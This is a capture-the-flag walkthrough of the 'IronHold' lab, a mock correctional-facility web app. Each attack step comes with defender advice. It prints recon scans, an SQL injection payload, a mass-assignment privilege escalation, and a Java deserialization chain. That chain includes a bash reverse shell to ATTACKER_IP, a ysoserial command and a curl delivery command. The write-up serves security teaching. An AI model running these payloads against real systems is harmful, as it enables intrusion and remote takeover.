**IronHold – CTF Walkthrough with Attacker & Defender Perspectives**

Scenario:  
The source leaked. Read it like an attacker, chain the flaws, and shell the door‑control server.

**Intelligence Gathering**
- First, I downloaded the repository and reviewed each file to understand the file structure and gather information.
- This was the initial step for reconnaissance: noting anything that looked interesting or important for later use.

Key file identified: DataSeeder.java

**Network Reconnaissance**
==========================
```
nmap -sS -p- TARGET_IP
```
result
```
Host is up (0.00059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```
Defender perspective:  
- Limit exposed ports with firewalls.
- Use intrusion detection to monitor scans.
- Harden SSH with key‑based authentication and rate limiting.

**Service Enumeration**
=======================
```
nmap -sS -sC -sV -p 22,8080 TARGET_IP
```
result
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c6:a3:4e:e8:0a:dc:45:04:01:5b:92:89:4a:12:c5:e9 (ECDSA)
|_  256 3e:32:27:13:eb:d6:a7:27:d4:c8:46:58:99:55:17:3a (ED25519)
8080/tcp open  http-proxy
|_http-title: Ironhold Correctional | Staff Login
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Set-Cookie: JSESSIONID=73FD887405545DB7B55566DCDE1C0DAA; Path=/; HttpOnly
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sat, 18 Jul 2026 07:49:22 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="UTF-8"/>
|     <title>Ironhold Correctional | Staff Login</title>
|     <link rel="stylesheet" href="/css/style.css;jsessionid=73FD887405545DB7B55566DCDE1C0DAA"/>
|     </head>
|     <body>
|     <header class="topbar">
|     <div class="brand">Ironhold Correctional
|     <small>Facility Management System</small>
|     </div>
|     </header>
|     <main>
|     <div class="login-shell">
|     <h1>Staff Login</h1>
|     class="muted">Authorised personnel only. All access is logged.</p>
|     <form class="stacked" action="/login" method="post">
|     <label for="username">Username</label>
|     <input type="text" id="username" name="username"
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Set-Cookie: JSESSIONID=D23108F282AD9933D335AEE4A258BAE3; Path=/; HttpOnly
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0
|     Date: Sat, 18 Jul 2026 07:49:22 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 18 Jul 2026 07:49:22 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
```
Version detection helpd map known exploits.

Defender perspective:  
- Keep services patched.
- Use banners that reveal minimal information.
- Monitor login attempts for anomalies.

**Web Application Recon**
=========================
Navigated to http://TARGET_IP:8080/

<img width="856" height="363" alt="ironhold_1_web_login" src="https://github.com/user-attachments/assets/62a5741e-d78d-4e05-966e-5e547a7eeb0e" />

Found staff login page.

Extracted credentials from DataSeeder.java.
```
String fillerHash = passwordEncoder.encode("redacted");
      String[][] officers = {
                {"j.reyes", "Officer J. Reyes", "O-104"},
                {"m.chen", "Officer M. Chen", "O-118"},
                {"a.osei", "Officer A. Osei", "O-129"},
                {"l.bianchi", "Officer L. Bianchi", "O-142"},
        };
```
Alternative
```
http://TARGET_IP/actuator/env/app.kiosk.pw | jq
```
Now Logged as Officer

<img width="939" height="323" alt="ironhold_1_web_officer_dashboard" src="https://github.com/user-attachments/assets/1c564744-ff0c-49d3-86f4-51009caca114" />

just navigated all the tab as regular user.

Defender perspective:  
- Never hardcode credentials.
- Rotate passwords regularly and enforce MFA.


**SQL Injection**
=================
Discovered inmate search vulnerable to SQL injection.

Used DataSeeder.java , case_files.java flle

Payload used:
```
0' union all select 1,2,summary from case_files;--
```

<img width="916" height="335" alt="ironhold_1_web_sql_inj" src="https://github.com/user-attachments/assets/a918cd9c-d728-443a-bead-070ed04cc2b2" />

Tried almost all tables for exfilteration but other data/tables not available.

Defender perspective:  
- JdbcTemplate is safe with queryForList(sql, args...) and unsafe when the SQL is pre-built from input.
- Use parameterized queries and ORM frameworks.
- Regularly test endpoints with automated scanners.
- Apply least‑privilege database accounts.


**Mass Assignment API Vulnerability**
====================================
A mass assignment vulnerability in an API happens when the backend automatically binds user-supplied input (like JSON data) directly to model attributes without properly filtering which fields are allowed.
Exploited mass assignment in staff.java via Burp Suite.
Used DataSeeder.java, staff.java file

When accessed admin panel got error

<img width="878" height="308" alt="ironhold_2_web_admin_error_panel" src="https://github.com/user-attachments/assets/f1c3a1ec-af8c-4608-a30e-f6679a1e9672" />


Before exploitation staff officer

<img width="873" height="314" alt="ironhold_2_web_staff_officer" src="https://github.com/user-attachments/assets/ce746c37-d96f-438b-a0d6-bfeab106d8fb" />


Exploited mass assignment feature through burp suite

<img width="698" height="296" alt="ironhold_2_web_mass_assignment" src="https://github.com/user-attachments/assets/87cf8de7-362b-4769-b28d-d44bce903059" />


After exploitation

<img width="947" height="272" alt="ironhold_2_web_mass_assignment_update" src="https://github.com/user-attachments/assets/bbd30024-4b36-445f-9cb5-8a3f8feaec81" />


Gained unauthorized access to the admin panel.

<img width="909" height="364" alt="ironhold_2_web_admin_panel" src="https://github.com/user-attachments/assets/732e913a-7324-457f-b0ee-c030f30ea8d7" />

Defender perspective:  
- bind a purpose-built input type, never your persistence model.
- Whitelist allowed fields in API models. 
```
@InitBinder
public void initBinder(WebDataBinder binder) { binder.setAllowedFields("email"); }
```
- Implement role‑based access checks server‑side.
- Log and alert on suspicious privilege changes.

**Admin Panel Enumeration & Java Deserialization RCE**
======================================================
Found vulnerable deserialization in AdminController.java.

Used [ysoserial](https://github.com/frohoff/ysoserial/releases) to craft payload. 

Listener For incoming connection
```
nc -lvnp 4545
```
base64 Reverse Shell code
```
printf '%s' '/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT_NUM 0>&1' | base64 -w0
```
result 
```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMzAuOTUuMTI1LzQ1NDUgMD4mMQ==
```
Passed base64 shell code to create payload
```
java --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMzAuOTUuMTI1LzQ1NDUgMD4mMQ==}|{base64,-d}|{bash,-i}" | base64 -w0 > shell.b64
```
Delivered reverse shell via /admin/import endpoint.
```
curl -s -X POST http://TARGET_IP:8080/admin/import --data-binary @shell.b64 -b 'JSESSIONID=3B98DE46DDA5C26B10F9F1FB7E757A7E' -H 'Content-type: text/plain'
```
Achieved interactive shell as appuser.

<img width="530" height="343" alt="ironhold_3_shell_appuser" src="https://github.com/user-attachments/assets/80f0a9c3-7c32-4cac-8826-1b02990cecfa" />

Defender perspective:  
- Disable unsafe deserialization.
- Validate and sanitize imported data.
- Use application firewalls to block suspicious payloads.
- Monitor for outbound reverse shells.


**Summary**
- Attacker chain: Source leak → Recon → Credential discovery → SQL injection → Mass assignment → Admin RCE → Shell access.
- Defender lessons:
- Protect source code.
- Harden exposed services.
- Secure coding practices (no hardcoded secrets, parameterized queries).
- Enforce strict API field validation.
- Monitor for exploitation attempts and unusual outbound traffic.
